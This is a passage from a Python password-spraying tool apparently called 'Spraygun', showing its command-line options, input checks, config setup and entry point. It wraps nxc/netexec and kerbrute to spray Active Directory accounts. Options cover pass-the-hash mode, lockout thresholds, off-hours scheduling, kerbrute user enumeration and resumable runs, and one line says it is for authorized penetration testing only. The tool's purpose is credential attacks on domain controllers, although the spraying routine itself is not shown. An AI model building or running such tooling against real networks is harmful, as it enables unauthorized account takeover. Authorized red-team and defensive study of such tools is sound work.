    parser.add_argument("--conn-fail-limit", type=int, default=10, help="(Deprecated) Connection failure threshold (now tracked for throttling; engines no longer abort on conn failures)")

    parser.add_argument("--nxc-path", help="Override path to nxc/netexec binary")
    parser.add_argument("--kerbrute-path", help="Override path to kerbrute binary")

    parser.add_argument("--resume", action="store_true", help="Resume from saved state")
    parser.add_argument("--dry-run", action="store_true", help="Emit fake tool output; no real sprays (for testing)")
    parser.add_argument("--no-preflight", action="store_true", help="Skip DC/domain preflight check")
    parser.add_argument("--log-dir", default="./spraygun-out", help="Output/state directory (default: ./spraygun-out)")

    # New operator fundamentals
    parser.add_argument("--filter-disabled", action="store_true", help="Pre-spray kerbrute userenum to filter non-existent accounts")
    parser.add_argument("--export", choices=["none", "json", "csv", "all"], default="none", help="Export results format (default: none)")
    parser.add_argument("--schedule", help="Spray window: business-hours, off-hours, or HH:MM-HH:MM (default: unrestricted)")
    parser.add_argument("--timeline", action="store_true", help="Generate spray-timeline.html visualization")
    parser.add_argument("--feed-lines", type=int, default=50, help="Number of lines in raw feed panel (default: 50)")

    args = parser.parse_args()

    # Validate inputs
    if not os.path.isfile(args.u):
        console.print(f"[!] Userfile not found: {args.u}", style="red")
        sys.exit(1)

    if not os.path.isfile(args.p):
        console.print(f"[!] Password/hash file not found: {args.p}", style="red")
        sys.exit(1)

    # Warn about PTH + kerbrute incompatibility
    if args.pth and args.tool == "kerbrute":
        console.print("[!] PTH mode requires --tool nxc (kerbrute cannot do pass-the-hash). Forcing nxc.", style="yellow")
        args.tool = "nxc"

    # Resolve binaries (skip for --dry-run)
    nxc_bin = args.nxc_path or shutil.which("nxc") or shutil.which("netexec") or ""
    kerbrute_bin = args.kerbrute_path or shutil.which("kerbrute") or ""

    if not args.dry_run:
        if args.tool == "nxc" and not nxc_bin:
            console.print("[!] nxc/netexec not found. Install: https://www.netexec.wiki/ or use --dry-run", style="red")
            sys.exit(1)

        if args.tool == "kerbrute" and not kerbrute_bin:
            console.print("[!] kerbrute not found. Install: https://github.com/ropnop/kerbrute or use --dry-run", style="red")
            sys.exit(1)

    # Build Config
    cfg = Config(
        userfile=args.u,
        passfile=args.p,
        domain=args.d,
        dc_ip=args.dc_ip,
        tool=args.tool,
        protocol=args.protocol,
        time_between_rounds=args.t,
        passwords_per_round=args.passwords_per_round,
        pth_mode=args.pth,
        lockout_threshold=args.lockout_threshold,
        lockout_burst=args.lockout_burst,
        conn_fail_limit=args.conn_fail_limit,
        nxc_path=args.nxc_path,
        kerbrute_path=args.kerbrute_path,
        resume=args.resume,
        dry_run=args.dry_run,
        no_preflight=args.no_preflight,
        log_dir=args.log_dir,
        filter_disabled=args.filter_disabled,
        export=args.export,
        schedule=args.schedule or "",
        timeline=args.timeline,
        feed_lines=args.feed_lines,
        nxc_binary=nxc_bin,
        kerbrute_binary=kerbrute_bin,
    )

    # Load users and passwords
    with open(args.u, "r") as f:
        cfg.users = [line.strip() for line in f if line.strip()]

    with open(args.p, "r") as f:
        cfg.passwords = [line.strip() for line in f if line.strip()]

    if not cfg.users:
        console.print("[!] No users found in userfile", style="red")
        sys.exit(1)

    if not cfg.passwords:
        console.print("[!] No passwords/hashes found in password file", style="red")
        sys.exit(1)

    # Author note
    console.print("[*] Spraygun — for authorized penetration testing only", style="dim")
    console.print(f"[*] Loaded {len(cfg.users)} users, {len(cfg.passwords)} secrets", style="cyan")

    # Run
    try:
        run(cfg, console)
    except Exception as e:
        console.print(f"[!] Fatal error: {e}", style="red")
        import traceback
        console.print(traceback.format_exc(), style="dim")
        sys.exit(1)

if __name__ == "__main__":
    main()
